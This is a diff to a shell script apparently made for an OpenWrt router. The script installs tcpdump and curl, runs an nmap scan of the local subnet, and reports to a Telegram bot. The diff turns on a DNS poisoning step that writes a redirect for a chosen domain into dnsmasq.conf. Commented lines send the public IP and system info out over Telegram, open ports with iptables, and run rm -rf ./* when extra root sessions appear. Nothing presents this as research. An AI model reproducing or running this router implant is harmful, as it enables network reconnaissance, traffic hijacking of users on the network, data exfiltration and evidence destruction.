@@ -6,6 +6,7 @@ if [ $? -eq 0 ]; then
     # Telegram bot info
     token=""
     chat_id=""
+    wifi_interface="br-lan" # to be change in base of wireless interface of router
 
     echo "Internet ok"
 
@@ -21,12 +22,12 @@ if [ $? -eq 0 ]; then
     if [ "$mem_mb" -lt 5 ]; then
         echo "Available memory less than 5MB"
         echo "    - Nmap will not be installed"
-        #opkg update
-        #opkg install openssh-sftp-server #51.21 KiB KiB
-        #opkg install libmbedtls #217.33 KiB
-        #opkg install curl #57.56 KiB
-        #opkg install ip-tiny #119.81 KiB
-        #opkg install tcpdump #281.03 KiB  
+        opkg update
+        opkg install openssh-sftp-server #51.21 KiB KiB
+        opkg install libmbedtls #217.33 KiB
+        opkg install curl #57.56 KiB
+        opkg install ip-tiny #119.81 KiB
+        opkg install tcpdump #281.03 KiB  
         echo "Dependencies ok"
 
         # Get public ip
@@ -69,7 +70,7 @@ if [ $? -eq 0 ]; then
     echo "Start scanning..."
     nmap_output_file="nmap_scan_$current_date.txt"
     touch $nmap_output_file
-    ip_address=$(ip addr show wlan0 | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)    
+    ip_address=$(ip addr show $wifi_interface | grep 'inet ' | awk '{print $2}' | cut -d '/' -f 1)     
     # Start scanning
     nmap -sS -O -sV $ip_address/24 >> $nmap_output_file
     echo "Scanning complete"
@@ -99,18 +100,20 @@ if [ $? -eq 0 ]; then
     #iptables -A INPUT -p tcp --dport $f_port -j ACCEPT
     #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Public ip: $public_ip %0ASystem info: $system_info %0APort forwading enabled: $public_ip":"$f_port"        
 
-    # DNS poisoning
-    #domain="example.com"
-    #ip_server="192.168.1.100"
+    #DNS poisoning
+    #site to redirect 
+    domain="example.com"
+    #set remote ip where to redirect the site
+    ip_server=""
     #edit dnsmasq.conf
-    #echo "address=/$domain/$ip_server" >> /etc/dnsmasq.conf
-    # restart dnsmasq
-    #systemctl restart dnsmasq
+    echo "address=/$domain/$ip_server" >> /etc/dnsmasq.conf
+    #restart dnsmasq
+    systemctl restart dnsmasq
     #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Redirection completed successfully: $domain -> $ip_server"
 
     #Session controll
     #sessions=$(who | awk '{print $1 " " $2 " " $5}' | grep "root")
-    #ount=$(echo "$sessions" | wc -l)
+    #count=$(echo "$sessions" | wc -l)
     #if [ "$count" -ge 2 ]; then
         #curl -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d chat_id="$chat_id" -d text="Warning: $count sessions %0AAutoremove"
         #rm -rf ./*
